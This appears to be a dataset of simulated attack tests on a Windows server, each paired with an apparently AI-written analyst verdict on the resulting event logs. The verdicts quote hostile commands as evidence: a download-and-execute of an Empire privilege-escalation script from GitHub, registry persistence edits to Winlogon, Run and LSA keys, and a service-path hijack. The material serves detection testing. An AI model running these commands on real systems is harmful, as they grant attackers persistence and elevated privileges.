- The PowerShell script execution to manage and potentially reset passwords using stored credential files is noteworthy. While the actual script doesn’t appear overtly malicious by itself, altering user passwords via an automated script without clear administrative purpose, especially on the CEO's machine, could be suspicious.
- The use of `Set-ADAccountPassword` within a script can be legitimate in system administration but potentially dangerous if used maliciously or without proper authorization, as it changes account credentials.

### Assessment of the Situation

The combination of PowerShell script activity aimed at altering and managing user credentials and failure handling, alongside the executed processes in close time proximity, suggests potentially unauthorized attempts to programmatically alter user credentials.

### Recommendations:

1. **Review the Origin and Purpose of the Script:**
   - Determine if the script is sanctioned by your IT or security team. 
   - Verify if there's any legitimate administrative need for such a script.

2. **User Verification:**
   - Check if `SERVER002\admin_test` has the necessary permissions and whether activity aligns with the user's typical behavior.

3. **Potential Security Risk:**
   - If the script was run without proper authorization, it could indicate a breach or internal threat actor. Immediate action should include reviewing all recent administrative password changes and credential file storage.

4. **Further Investigation:**
   - To classify this activity more definitively, conduct an in-depth investigation into past activities of the affected user account and any corresponding machines.

### Conclusion

Based on the current analysis, the activity documented in the logs is classified as **SUSPICIOUS** given potential unauthorized credential management attempts. Further investigation to confirm intent and authorization is necessary to properly evaluate any potential threats."
Parent PID Spoofing - Spawn from New Process,"### Detailed Analysis of the Logs

#### **Overview:**
The logs from the provided Windows host (Server002) display activity mostly revolving around processes initiated under the `admin_test` user context with a notable focus on PowerShell execution and command-line operations. 

#### **Suspicious or Anomalous Behavior Detected:**

1. **PowerShell Execution:**
   - The PowerShell logs show an execution of a command that involves starting Notepad.exe and executing a sleep command. The use of `Start-Process` with a chained command to execute another PowerShell session is suspicious as it indicates potential process injection or evasion techniques. This is particularly concerning as such techniques are often used in attack scenarios where a script seeks to hide its activity.

2. **Sysmon Process Creation:**
   - The logs show processes typically associated with administrative command-line tools like `whoami.exe` and `hostname.exe`, but the context is unusual when considering the PowerShell activity. 
   - The `whoami.exe` command is a legitimate process used to identify the logged-in user. However, within the same timeframe as the PowerShell execution, it could imply checking user privileges as part of a lateral movement or privilege escalation attempt.

3. **Bulk Process Creation by `admin_test`:**
   - There are multiple instantiations of administrative command-line utilities (`wevtutil.exe`, `conhost.exe`) under `admin_test`. The frequency and grouping of these events may indicate a script or automated process, which is unusual and could be indicative of malicious scripting activity.

#### **Indicators of Potential Compromise:**

- The use of PowerShell with specific command-line arguments that attempt to manipulate the system environment is a tactic commonly employed by attackers to either move laterally within a network or escalate privileges.
- Process trees show starting administrative tools like `wevtutil.exe`, `whoami.exe`, and PowerShell execution in a rapid sequence, which aligns with techniques to gather system information, often seen in reconnaissance phases of an attack.

### **Assessment:**
Based on the analysis, the Windows event logs reveal evidence that may suggest suspicious behavior primarily centered around misuse of PowerShell for potential process manipulation or privilege escalation. The activities, although they could be part of automated admin tasks, require closer scrutiny given their potential alignment with common attack patterns.

### **Resolution:**
**SUSPICIOUS** - The logs contain activity that suggests further investigation is needed to validate intent and assess any breaches. There are indicators that align with behaviors seen in typical compromise scenarios, specifically associated with PowerShell misuse and unauthorized information gathering.

### **Guidance on How to Proceed:**

1. **Incident Response Initiation:**
   - Initiate a more detailed investigation into the `admin_test` account. Review account activity logs, examine any recent changes in user permissions, and evaluate access against company policy for any deviations.

2. **Conduct System Forensics:**
   - Investigate the PowerShell scripts executed and scrutinize the exact content of scripts during the timeframe of suspicious behavior. Look for additional anomalies in system and network traffic related to the machine.

3. **Verify Integrity of Critical Systems:**
   - Check for any file integrity changes on the host and scan for known malware signatures that utilize PowerShell.

4. **Implement Monitoring:**
   - Increase the logging level for PowerShell activities and other command-line executions. Implement alerts for similar patterns that are identified as potentially risky.

5. **User Education and Training:**
   - As this instance involves administrative tools, ensure all IT personnel are aware of the risks associated with PowerShell misuse and the indicators of potential security incidents."
Winlogon Notify Key Logon Persistence - PowerShell,"**Analysis of Windows Event Logs**

### Suspicious or Anomalous Behaviors:
1. **PowerShell Logging**:
    - The PowerShell logs show the script creating and modifying registry entries related to the Windows logon process:
      - `New-Item ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\file"" -Force`
      - Setting properties, including `DllName`, `Logon`, `Impersonate`, and `Asynchronous`, directly in the Winlogon Notify key.
    - This activity is suspicious because:
      - Modifying the Winlogon Notify key can be used for persistence by loading malicious DLLs during the logon process. The DLL specified, `C:\Windows\Temp\fileNotificationPackage.dll`, is in a temporary directory, which is unusual.

2. **Security Log**:
    - The security logs do not show any privilege escalation or abnormal user activities.

3. **Sysmon Logging**:
    - Multiple executions of `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test`:
      - `wevtutil.exe` is used legitimately to interact with Windows event logs but can also be used maliciously to clear logs or gather sensitive audit logs.
      - `conhost.exe` executions are normal when opening a console window, but the frequency and sequence are unusual.
    - A `hostname.exe` and `whoami.exe` execution by `SERVER002\admin_test`:
      - These commands might be used in reconnaissance activities.
    - The `powershell.exe` activity corroborates the PowerShell logs, where suspicious registry modifications are being made.

4. **System Log**:
    - System log entries depict regular activities, except for multiple time adjustments by `svchost.exe`, which could indicate attempts to obfuscate activity.

5. **Application Log**:
    - Logs related to Software Protection Platform (sppsvc.exe) do not show any anomalies.

### Assessment of the Situation:

Based on the logs analyzed:

- The PowerShell script's actions modifying the Winlogon registry key to run a DLL located in a temporary directory are highly suspect and indicative of persistent malware activity.
- The use of `wevtutil.exe` along with frequent executions of other utilities like `conhost.exe` can imply anti-forensic measures or preparatory tasks for log tampering or further system enumeration.

### Conclusion:
- **Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Containment:**
   - Isolate the affected machine (Server002) from the network to prevent further unauthorized access or lateral movement by an attacker.
   
2. **Further Investigation:**
   - Check for the presence and authenticity of the DLL `fileNotificationPackage.dll` in `C:\Windows\Temp`.
   - Examine any processes associated with `SERVER002\admin_test` that demonstrate unusual behavior, especially around the time of the PowerShell execution.
   - Review recent authentications and access patterns for `admin_test`. 

3. **Eradication and Recovery:**
   - If confirmed malicious, remove the unauthorized registry entries in the Winlogon Notify key.
   - Perform a full antivirus and anti-malware scan.
   - Restore the system from a known good backup if necessary.

4. **Strengthen Security Posture:**
   - Implement stricter controls on PowerShell usage through execution policies and logging enhancements.
   - Monitor critical registry keys and set alerts for any modifications.
   - Review and tighten user account privileges and access logs.

This assessment and response plan should help mitigate the detected threat and fortify defenses against similar activities in the future."
Simulate - Post BEC persistence via user password reset followed by user added to company administrator role,"Upon reviewing the provided logs, I have identified several key observations and concerns:

1. **Microsoft Edge Installer and PowerShell Activity:** The event logs show the execution of `setup.exe` for the Microsoft Edge installer, which appears legitimate based on the description and file path (`C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\`). However, this is followed by a PowerShell execution by the user `SERVER002\\admin_test`:
    - The PowerShell command executed with a complex script includes potentially risky actions (`Import-Module`, `Connect-MsolService`, `Connect-AzureAD`) and password handling using plain text and secure strings. The operations appear to manipulate AzureAD, reset user passwords, and assign roles.
    
2. **Use of Administrative Privileges:** The PowerShell script executed with high integrity, indicating administrative privileges were used. The script also targeted roles such as ""Company Administrator"" and ""Global Reader,"" potentially altering user roles within the AzureAD environment.

3. **Suspicious Pattern in Security Log:** The `CompatTelRunner.exe`, a legitimate executable from Microsoft used for telemetry, is associated with listing various domain accounts, such as ""Guest"", ""Administrator"", and other user accounts. This activity could be part of a legitimate system inventory activity or could indicate information gathering for potential illicit activity.

4. **Persistently Elevated Activity:** There are frequent process creations with elevated privileges around the same time frame, including system management and telemetry services. While these might be usual system processes, combined with the PowerShell activities, they stand out as potential signs of a compromised system.

5. **Absence of Specific Security Events:** While security audit success events (e.g., `EventID 4624`) are logged, there is no direct evidence of failed login attempts or privilege escalation failures, suggesting that if any malicious activity occurred, it was done with seemingly legitimate credentials or exploits that did not trigger typical alerts.

**Assessment and Recommendation:**
- **Resolution:** **MALICIOUS**
- **Justification:** The complex PowerShell script executing roles and password operations in AzureAD, combined with the context and timing of the elevated privileges and security group enumeration, strongly suggests malicious intent and potential insider threat or compromised credentials.
- **Action Plan:**
  1. Conduct a thorough investigation into the `admin_test` account's activities and accesses.
  2. Immediately isolate and investigate the host for further forensic analysis.
  3. Review user roles and recent changes in AzureAD and reset affected user credentials.
  4. Strengthen monitoring and alerting on all script-based actions, especially those involving credential handling and privilege changes.
  5. Ensure that the Microsoft Edge installation was legitimate and verify the source of any updates or installers."
Modify Service to Run Arbitrary Binary (Powershell),"Based on the provided event logs, I'll conduct an analysis focusing on any suspicious or anomalous behavior:

1. **PowerShell Logs:**
   - At 2024-10-27 13:02:26, multiple PowerShell events indicate the execution of a script using `HostApplication=powershell.exe & {Stop-Service -Name ""fax"" -...'`. This script involves stopping the ""fax"" service, changing its binary path to point to `Notepad.exe`, and restarting it. This is indicative of a potential service hijacking technique often used by attackers to escalate privileges or execute malicious payloads under a different service's context.

2. **Security Logs:**
   - Event ID 4616, which logs the system time change, doesn't appear to show any unusual behavior beyond system time synchronization.

3. **Application Logs:**
   - Event IDs related to Microsoft Fax (32026, 32068) are present, likely aligning with the PowerShell script's execution that interacted with the fax service. This further confirms that the service’s binary path was altered, potentially for malicious purposes.

4. **System Logs:**
   - No unusual entries indicating direct tampering or misconfigurations outside standard time adjustments.

5. **Sysmon Logs:**
   - The execution of `WindowsPowerShell.exe` from `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` with high integrity level and the command structure as logged in the Sysmon events confirm the use of PowerShell for potentially malicious activity.
   - The series of logged processes and command lines align with leveraging PowerShell for administrative-level changes, including possibly unauthorized ones, indicated by changes to the service paths.

**Assessment:**
- The behavior observed in the PowerShell logs of changing the service executable for “fax” to `notepad.exe` is highly suspicious and aligns with tactics used for running unauthorized or malicious code on systems with escalated privileges.
- This points towards inadequate conventional usage; the intention seems to be service manipulation for potential code execution under the guise of a legitimate service, which is a known method for persistent attacks.

**Resolution: MALICIOUS**

**Guidance:**
- Immediate action is required to investigate and remediate the affected systems. Steps should include:
  - Restoring the legitimate binary path for the affected service.
  - Scanning the system for additional changes and potential malware.
  - Auditing user and service account activities to identify unauthorized access or privilege escalation.
  - Reviewing security policies around PowerShell usage and service permissions to harden systems against similar attacks in the future."
Import XML Schedule Task with Hidden Attribute,"Upon analyzing the provided Windows event logs from the CEO's machine, I found several events of interest that require closer examination:

1. **PowerShell Activity:**
   - Multiple `PowerShell` events (Event IDs 600) captured show a script being executed with the command `Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\\Microsoft\\Windows\\TaskScheduler"" -MethodName ""RegisterByXml""`. This PowerShell activity is indicative of a script that is used to register a task via XML configuration, located in a temporary directory with a filename `data_05_SCTASK_HIDDEN_ATTRIB.xml`. The use of temporary directories and XML for task registration is a common method for attackers to persist on a system.

2. **Sysmon Activity:**
   - PowerShell processes (Event ID 1) are shown executing commands from `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`. The command line shown in these events matches the suspicious PowerShell activity from the PowerShell logs.
   - Frequent execution of `conhost.exe` and other built-in Windows utilities like `wevtutil.exe` and `whoami.exe` under the same `User` account (`SERVER002\\admin_test`) could be a sign of lateral movement attempts or privilege escalation activities, especially if automated via scripts.

3. **Scheduled Task Registration:**
   - The registration of scheduled tasks using PowerShell, especially from an XML file in a hidden or temporary location, is a red flag. This is often used for maintaining persistence by malicious entities.

4. **Network and System Service Activity:**
   - There are events indicating execution of system services like `sppsvc.exe` under Network Service and SYSTEM privileges which can be normal, but given the context of other findings, they may be tied to unauthorized privilege escalations.

Based on the analysis:

- **Assessment of the Situation:**
  The combination of PowerShell scripts registering tasks in a seemingly covert manner, along with the frequent execution of system utilities, suggests potential malicious activity aimed at persistence and potential privilege escalation. The use of scheduled tasks and the execution of these utilities in concert with PowerShell scripts suggest attempts at automated, potentially malicious actions.

- **Threats and Risks Identified:**
  - Unauthorized persistence mechanism via PowerShell scripts and scheduled task registration.
  - Potential for lateral movement using native Windows utilities by impersonating a legitimate user (`admin_test`).
  - Possible privilege escalation, making the system vulnerable to further exploitation.

- **Guidance on How to Proceed:**
  - Immediately isolate the CEO's machine from the network to prevent any potential spread of the issue.
  - Conduct a full forensic analysis of the system, specifically targeting the PowerShell scripts and any newly created scheduled tasks.
  - Review access logs and configurations for any unauthorized changes or suspicious behaviors.
  - Update endpoint security measures to include detection of such PowerShell and task scheduler activities.

**Resolution: MALICIOUS**

The evidence points to activities commonly associated with malicious behavior, particularly with the automation of such activities via scripting and scheduled tasks."
Shortcut Modification,"### Detailed Analysis of Logs

#### 1. **Time Change Events**

The logs capture several events related to time changes:

- **Security EventID 4616**: This type of event denotes a system time change. This is observed twice within a span of milliseconds on the computer `Server002`. The logs show the `PreviousTime` and `NewTime` having discrepancies for a few milliseconds. This is corroborated by system logs from the Kernel-General, indicating a time adjustment.
  
- **System EventID 1 and 24**: These indicate a similar alteration of system time, where the `OldTime` and `NewTime` indicate stormy clock drift corrections. The process responsible is `svchost.exe`.

**Assessment**: This likely indicates a benign synchronization with an external time source (`time.windows.com`), especially since a Network Time Protocol (NTP) service is typically involved in such adjustments.

#### 2. **Process Execution**

- **PowerShell Logs**: Unavailable, thus unable to assess script-based anomalies or malicious script usage.

- **Sysmon Events**: 
  - **Command Line Execution**: A particular `cmd.exe` command was run that attempts to create a URL file to execute `calc.exe`. The Parent Process for `cmd.exe` is `wsmprovhost.exe`, often associated with Windows Remote Management.
  
  - **Command in question**: 
    ```plaintext
    ""cmd.exe"" /c echo [InternetShortcut] > %%temp%%\data.009_modified_shortcut.url & echo URL=C:\windows\system32\calc.exe >> %%temp%%\data.009_modified_shortcut.url & %%temp%%\data.009_modified_shortcut.url
    ```
  
  - This approach can be leveraged for proxy execution or bypassing certain execution prevention techniques, indicating suspicious activity.
  
#### 3. **High Integrity Level Execution**

The execution of several processes was identified under high integrity levels, indicating these were run with elevated privileges:

- **Processes such as**: 
  - `conhost.exe`
  - `whoami.exe`
  - `wevtutil.exe`

These are standard Windows utilities, and the `whoami.exe` being run frequently might indicate user enumeration, which can be part of a discovery phase of a cyber attack.

#### 4. **Indicator of Potential Malicious Activity**

- The specific command execution via `cmd.exe` to create a shortcut that points to calculator suggests:
  - A potential attempt to mask malicious behavior as normal activity or a test for arbitrary code execution.
  - It raises red flags due to its technique to execute another application instead.

#### 5. **Miscellaneous Logs**

- **Application and Edge Update Activity**:
  - Continuous updates installation by the `MicrosoftEdgeUpdate.exe` and related components are standard operational behaviors and do not presently indicate a concern.

### Conclusion

- **Time Changes**: Generally benign, seen as normal NTP-related behavior.
- **Sysmon Activity via command execution**: Raises suspicion due to questionable command practices.
- **Frequent system utilities usage with High Integrity levels**: Indicative of potentially non-benign user enumeration or further remote analysis/testing.

### Resolution: **SUSPICIOUS**

**Guidance**:

- **Review Command**: The particular `cmd.exe` use should be investigated to understand the user motivation or source.
- **Check Remote Admin Tasks**: Validate if ongoing support or administrative tasks align with these actions.
- **Monitor for More Events**: Increased vigilance on EVENT IDs associated with execution and their command line arguments.
- **Confirm User Role and Actions**: Ascertain legitimacy behind user `SERVER002\admin_test` actions to rule out falsification.
- **Conduct Endpoint Security Checks**: Ensure endpoint detection tools alert adequately if this type of pattern occurs more frequently.

This suggests the need for further investigation to ascertain motives and confirm the integrity of the session described. Logs deciphered thus invite caution but don't conclusively prove a breach."
`SeDebugPrivilege` token duplication,"Upon reviewing the provided Windows event logs, here's a detailed analysis highlighting any suspicious or anomalous behavior that indicates potential malicious activity or compromise:

### Analysis

1. **Process Execution and Command Line Arguments:**
   - **PowerShell Execution:**
     - A PowerShell command is executed with the command line:
       ```powershell
       ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose}
       ```
     - This command retrieves and executes a script from GitHub, associated with BC-Security's Empire framework, which is often used for penetration testing and red teaming exercises. This suggests a potential compromise due to unauthorized retrieval and execution of a script from an external source using `Invoke-Expression` (`IEX`).

2. **Time Changes:**
   - Events show that time changes occurred that could indicate an attempt to manipulate time-related logs. This may indicate a tactic aimed at hindering forensic investigations by tampering with time stamps.

3. **Process Execution Pattern:**
   - Frequent execution of legitimate Windows binaries (`whoami.exe`, `conhost.exe`, `wevtutil.exe`, etc.) under user `SERVER002\admin_test` in quick succession (almost simultaneously) can represent normal behavior, but it may also indicate script or automated tool-like behavior simulating system reconnaissance or file/event log manipulation.

4. **Host Execution and ICMP Activity:**
   - Usage of `hostname.exe`, `whoami.exe`, and frequent spawning of `conhost.exe` indicate potential system enumeration activities which are typically performed during the reconnaissance phase in attacks.

5. **Security and System Logs:**
   - Though Windows Defender is on and operational, the presence of the anomalous PowerShell activity shows a potential gap in real-time detection.
   - In the system log, changes in time could connote an anomaly in system configuration or adversarial activity intended to mask other actions.

### Assessment and Resolution

The provided logs indicate certain actions that collectively amount to a significant security concern, notably the retrieval and execution of potentially malicious PowerShell script from GitHub. This activity points toward unauthorized system manipulation aiming for privilege escalation, characteristic of penetration testing frameworks like Empire. Due to the usage of external scripts for potentially escalating privileges, the activity stands out as suspicious and likely malicious.

### Resolution: MALICIOUS

### Guidance on How to Proceed

1. **Immediate Action:**
   - Disconnect the affected host from the network to contain any potential spread of the compromise.
   - Analyze network traffic for other similar outbound connections that might indicate other affected systems.
   - Investigate any unauthorized access to sensitive data or changes in data integrity.

2. **Forensic Investigation:**
   - Conduct a full forensic analysis to determine the extent of compromise and persistence mechanisms.
   - Capture memory and disk images for in-depth analysis.
   - Analyze all user accounts for any signs of further unauthorized access.

3. **Security Posture Review:**
   - Review security policies and implement stricter application whitelisting to block unsanctioned privilege execution.
   - Consider enhanced monitoring and alerting on PowerShell script executions and other script hosts.

4. **Awareness and Training:**
   - Educate users on risks associated with running unapproved scripts and the importance of vigilance in spotting potential phishing attempts.

Taking these steps will help to mitigate the threat and prevent future incidents of this nature."
Process Hollowing in Go using CreateProcessW WinAPI,"### Analysis:

#### System Log:
1. **Time Change Events (EventID: 1, 24)**: The logs indicate a sequence of time changes where the system time was adjusted backwards from 18:37:47 to 18:37:21. This is unusual, especially if there’s no justification like a system update or manual confirmation for daylight saving changes. Time changes can be used by attackers to obscure evidence.

#### Sysmon Log:
2. **Process Creation by `wevtutil.exe` & `conhost.exe`**: Multiple logs showing execution of these system utilities which are generally used to query the event logs (`wevtutil`) and to host console windows (`conhost`). Their repeated execution is somewhat suspicious, especially under the context of ""admin_test"" which indicates a potentially misguided administrative action or a compromised account.

3. **Host and Whoami Execution (EventID: 1)**: Execution of `hostname.exe` and `whoami.exe` - while these are common commands, their presence with high integrity and immediate sequence suggests verification of the user/environment context, a possible reconnaissance step.

4. **PowerShell (EventID: 1, 5)**: The usage of PowerShell to initiate `CreateProcess.exe` from a temporary file directory is very suspicious, as this attempts to debug `werfault.exe`, which could indicate an attempt to exploit or manipulate error reporting features.

5. **Execution of `powershell.exe` with Suspicious Command Line**: A PowerShell command executes another process using a temp path with `CreateProcess.exe`, which could be indicative of a malicious payload deployment.

#### Windows PowerShell Log:
6. **Suspicious PowerShell Sessions**: The logs capture the start and stop of a session that might have been conducted for malicious activity due to the involvement of `CreateProcess.exe` to run `werfault.exe` in debug mode. This is anomalous behavior for a server and suggests potential malicious exploitation.

#### Security Log:
7. **Privileges Granted (EventID: 4672)**: The `admin_test` user is granted a set of privileges (e.g., SeDebugPrivilege) which can be abused to manipulate system processes or access critical system components. Given the context of suspicious PowerShell execution, this suggests a risk of privilege escalation or abuse.

8. **NTLM Logon (EventID: 4624)**: The NTLM authentication and high set of privileges hint at possible lateral movement or unauthorized access attempts.

### Assessment:
The logs indicate:
- **Time anomalies** in system events, which can be indicative of tampering.
- Suspect use of **PowerShell** with `CreateProcess.exe` in temp directories, potentially harboring malicious intentions.
- Activities such as privilege assignment and frequent execution of system tools by a non-standard administrative account, suggesting potential misuse or compromise.

### Guidance:
1. **Immediate Investigation** into the `admin_test` account's activities, including password changes and a review of authorized actions.
2. **Review Time Adjustments** for potential tampering, correlating with other logs and timestamps.
3. **Deep Dive** into processes initiated through PowerShell scripts from temporary directories for possible exploits or persistence mechanisms.
4. **Consider Isolation** of the system to prevent further unauthorized access or lateral movement.

### Resolution:
**MALICIOUS** - The logs contain clear signs of activity that align with malicious behaviors, specifically in the suspicious command-line executions, PowerShell utilization, and potential privilege misuse. Immediate action is necessary to investigate and mitigate potential threats."
Winlogon HKLM Shell Key Persistence - PowerShell,"After thoroughly reviewing the provided Windows event logs, the following analysis has been made:

### Analysis of the Logs:

1. **Application Log:**
   - The log entry for `Software Protection Platform Service` seems benign, related to a routine update or event within the Windows operating system. The `RulesEngine` mention implies a benign internal process.

2. **System Log:**
   - The events detail routine time-keeping activities by `svchost.exe`, which is normal for synchronizing the system clock, nothing suspicious here.

3. **Windows PowerShell Log:**
   - The PowerShell logs indicate the modification of the registry key related to the Windows Shell. Specifically, `Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, C:\Windows\System32\cmd.exe"" -Force` is abnormal and concerning. This command alters the shell to open both `explorer.exe` and `cmd.exe`, which can be used to execute further malicious actions or open a backdoor.

4. **Sysmon Log:**
   - Multiple entries involving the execution of system utilities like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` are noted. While execution of these tools can be normal, their association with elevated integrity levels and close proximity in execution to each other is suspicious, especially in a series involving PowerShell manipulation.
   - The execution of `whoami.exe` suggests user context verification, which while common for administrative tasks, paired with the PowerShell event is suspicious.
   - The execution of PowerShell with a high integrity level and the context `Set-ItemProperty ... {Winlogon}` points to likely misconduct.

5. **Security Log:**
   - Events indicate routine time synchronization with the subject user being `LOCAL SERVICE`, which is typical and does not indicate malicious activity.

### Assessment:

The logs suggest potential malicious activity focused around the PowerShell command modifying the `Winlogon` registry key, which is often a tactic to maintain persistence on a compromised machine. This, combined with multiple executions of system utilities from a seemingly non-standard user account (`SERVER002\admin_test`) raises significant suspicion given the context.

### Conclusion:

**Resolution: MALICIOUS**

The activity captured in the logs, especially the use of PowerShell to modify key elements like `Winlogon`, strongly indicates nefarious intent, possibly aiming at persistence or further exploitation. Immediate action is recommended to isolate the affected host, conduct a thorough forensic investigation to determine the extent of the compromise, and ensure remediation steps such as registry cleans, policy changes, and user education to prevent future occurrences."
Reg Key Run,"After reviewing the logs provided, I have analyzed events that might indicate potential malicious activity. Here are my findings:

1. **Time Synchronization Events**:
   - Multiple events related to time changes are logged. These events are generated by `svchost.exe` and involve adjustments to the system time. However, these adjustments align with normal Windows time synchronization activities, such as those with an NTP server (`time.windows.com`), and involve the `LOCAL SERVICE` account, which is standard for time change actions.
   - These appear benign and expected behaviors for a system maintaining accurate time synchronization.

2. **PowerShell Log**:
   - There were no entries in the PowerShell log provided, so no suspicious PowerShell activity could be identified.

3. **Application Log**:
   - An event related to the `Software Protection Platform Service` was logged. This service is responsible for license management and not inherently suspicious unless there are signs of tampering or unusual usage, which are not indicated here.

4. **Security Log**:
   - Time change events from the Security Audit logs corroborate the Kernel-General logs and reflect standard time adjustments.

5. **Sysmon Log**:
   - **Suspicious Command Execution**:
     - A process `cmd.exe` runs with the command line that adds an entry to the Windows startup registry key: `REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""file file"" /t REG_SZ /F /D ""C:\Path\file.exe""`. 
     - Modifying the startup registry key can be indicative of malware persistence tactics, particularly if the command or file is unfamiliar or unauthorized.
   - **Process Activity**:
     - We observe multiple executions of standard Windows utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, and `reg.exe` by the user `SERVER002\admin_test`, with a high integrity level. The commands themselves do not inherently appear malicious except for the registry modification.
   - **User Activity**:
     - The processes conducted by `admin_test` include typical administrative tasks, but combined with the registry addition, raise concerns about the legitimacy of these actions.

Given the analysis, there is one notable event concerning potential malware persistence through the registry modification by `cmd.exe`. This is indicative of a method often used by malicious actors to ensure their payload runs upon system startup. However, due to the lack of additional context (e.g., whether `file.exe` is known malware, unauthorized, or intentional by the user `admin_test`), it warrants further investigation.

### Final Assessment: SUSPICIOUS

Recommendations:
- **Investigate the `file.exe`** referenced in the registry modification for legitimacy. Determine if this file is known or can be associated with legitimate software or if it might be malicious.
- **Review user activities** for `admin_test` on `SERVER002` to justify the need for `cmd.exe` command line usages.
- **Check for any other suspicious activities** within the network that might correlate with this behavior.
- If possible, conduct a scan with updated anti-malware tools on the affected machine for assurance.

This activity should warrant closer inspection to confirm whether it truly represents malicious intent or was benign and authorized."
HKLM - re-execute Internet Explorer Core Fonts' StubPath payload by decreasing version number,"After examining the provided Windows event logs, here are the findings and recommendations:

1. **Analysis of Observed Events:**

   - **Frequent Execution of `wevtutil.exe` and `conhost.exe`:** There are several instances of `wevtutil.exe` and `conhost.exe` being executed repeatedly by the user `SERVER002\admin_test`. While `wevtutil.exe` is a legitimate utility used for managing event logs, frequent executions in a short burst may warrant further exploration to understand the underlying reason. This could be part of legitimate administrative tasks, such as exporting logs, or could signify an automated script.

   - **PowerShell Command Execution:** A PowerShell event indicates a command intended to modify a registry key:  
     ```
     Set-ItemProperty -Path ""HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" -Name ""Version"" -Value ""0,0,0,0""
     &
     $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup
     ```
     This command modifies a configuration for a component potentially related to user profile settings. The use of `runonce.exe` suggests it could be an attempt to execute something once at the next startup. Without context, this could be an administrative task but is also common in persistence mechanisms used by malware.

   - **EdgeUpdate Activity:** Multiple events indicate the Microsoft Edge Update process being initiated under `NT AUTHORITY\SYSTEM` at different integrity levels. The Edge Update processes appear normal, as they typically are scheduled operations to check for browser updates.

   - **Time Synchronization:** Events in the Security and System logs indicate time changes and synchronizations, which are normal operations for adjusting system clocks aligned with an NTP (Network Time Protocol) server.

2. **Indicators of Malicious Activity:**

   - **Command Line Use of PowerShell and RunOnce:** The PowerShell log indicates a script execution involving the registry's modification and `runonce.exe`. While not conclusively malicious on its own, such scripts are commonly used by attackers to establish or maintain persistence.

3. **Conclusion and Recommendations:**

   - **Resolution:** **SUSPICIOUS**  
     The logs depict legitimate activities (e.g., `wevtutil.exe`, Edge Updates), but the PowerShell script execution is unexpected without context. The modification of registry values can possibly hint towards unauthorized persistence tactics. Given the criticality of the machine (CEO's), this warrants additional investigation to confirm legitimacy.

   - **Actions to Take:**
     - **Validate Legitimacy:** Confirm with the IT department or relevant personnel if recent administrative tasks involved registry changes or PowerShell scripts. Assess if `wevtutil.exe` executions align with intended logging tasks.
     - **Conduct an Endpoint Scan:** Use EDR tools to perform a full scan on the host to identify any potentially unnoticed threats.
     - **Monitor for Further Activity:** Enable heightened monitoring on the CEO's machine for repeated patterns or further PowerShell executions without expected context.
     - **Limit PowerShell Usage:** If unnecessary for operations, restrict PowerShell usage or apply increased auditing/logging for detailed activity logging.

Further examination and context are advised to ensure the security health of the CEO's machine and eliminate any potential threat."
Authentication Package,"Upon reviewing the provided logs for the Windows host on the CEO's machine, several indicators of potential malicious activities are found. Here is a breakdown of the analysis:

1. **System and Security Logs:**
    - The initial events marked by *Microsoft-Windows-Kernel-General* denote time changes on the system. Although time anomalies can sometimes indicate tampering, they are typically benign if legitimate time synchronization services cause them. In this case, it aligns with standard Windows Time Service synchronization to `time.windows.com`.

2. **Sysmon Logs:**
    - There's an unusually high frequency of process creation involving `svchost.exe`, `conhost.exe`, and notably `wevtutil.exe`. This may indicate process spawning related to event log manipulation, especially by `admin_test`.
    - The execution of `powershell.exe`, notably with a command line attempting to copy a `.dll` file to `C:\Windows\System32\` and subsequent registry alteration targeting `Authentication Packages`, signifies a highly suspect activity typical of credential theft attempts or persistence mechanisms.
    - The use of `reg.exe` echoes the previous attempt in changing critical security settings, typically seen in privilege escalation or rootkit behaviors.

3. **Windows PowerShell Logs:**
    - The Windows PowerShell event logs correspond to activity from `powershell.exe` as evidenced in the Sysmon logs. The commands involve altering the `Lsa` registry keys, typically indicating an attempt to install a malicious package or enable a rogue authentication method, a known persistence technique.

4. **Application Logs:**
    - Several logs from `edgeupdate` indicate services being stopped. This could likely be related to potential persistence mechanisms or stopping security tools/services under the guise of software updates.

### Assessment and Conclusion:
- The combination of suspicious PowerShell usage, registry modification, frequent invocation of system processes like `wevtutil.exe`, and high privileges of associated user `admin_test` strongly suggests a compromise or ongoing attack attempt involving privilege escalation or persistence.

### Resolution: MALICIOUS
Due to the highlighted suspicious activities, especially the execution of PowerShell scripts attempting to alter security-sensitive registry keys, this behavior is consistent with known malicious patterns. Hence, the resolution of the logs is **MALICIOUS**.

### Guidance:
1. **Immediate Isolation:** Isolate the affected system from the network to prevent further spread or data exfiltration.
2. **In-depth Investigation:** Conduct a full forensic investigation of the host, focusing on memory analysis and further timeline reconstruction.
3. **Credential Changes:** Advise the CEO to change all credentials used on the affected device.
4. **Review Security Policies:** Ensure appropriate security measures and monitoring capabilities are in place to detect and mitigate similar future incidents.
5. **Patch and Update:** Apply all pending security patches to the system, and review configurations to enhance security hygiene.

Finally, communicate findings with relevant stakeholders and comply with any regulatory required reporting procedures."
LockBit Black - Modify Group policy settings -Powershell,"### Analysis of Windows Event Logs

**Suspicious or Anomalous Behavior:**

1. **Unexpected PowerShell Execution:**
   - A PowerShell command (`powershell.exe & {New-ItemProperty ...}`) was executed to modify several registry keys related to Group Policy Refresh Time and SmartScreen configurations. This behavior is suspicious as it indicates someone attempting to change system policies, which is a common technique for persistence or to lower security settings.
   
2. **User Context:**
   - The commands related to registry modifications were executed under the `SERVER002\admin_test` user account. The combination of changing sensitive configurations and the administrative privileges involved is concerning.
